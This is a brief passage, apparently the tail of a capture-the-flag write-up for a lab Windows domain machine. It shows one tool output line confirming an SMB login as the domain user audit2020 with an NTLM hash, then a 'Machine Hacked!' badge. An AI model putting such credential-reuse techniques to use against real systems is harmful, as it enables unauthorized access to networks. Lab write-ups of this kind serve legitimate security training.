SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:c95ac94a048e7c29ac4b4320d7c9d3b5 ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
